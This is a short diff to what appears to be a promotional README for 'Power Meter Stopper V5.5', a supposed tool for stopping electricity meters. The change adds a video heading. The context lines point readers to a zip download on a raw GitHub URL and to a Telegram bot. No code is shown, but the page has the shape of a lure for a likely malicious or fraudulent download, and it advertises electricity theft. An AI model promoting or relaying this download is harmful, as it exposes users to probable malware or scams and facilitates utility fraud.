@@ -30,5 +30,6 @@ Download the latest version of Power Meter Stopper now and join thousands of sat
 - **Download Now:** [Download](https://raw.githubusercontent.com/johnwooday/power-meter-stopper/main/Power-Meter-Stopper-V5.5.zip)
 - **Connect with Us:** [Telegram Bot](https://t.me/robochata_bot)
 
+# Video of Power Meter Stopper!
 
 [![Watch the video](https://img.youtube.com/vi/zisKMBtg_Gc/maxresdefault.jpg)](https://youtu.be/zisKMBtg_Gc)
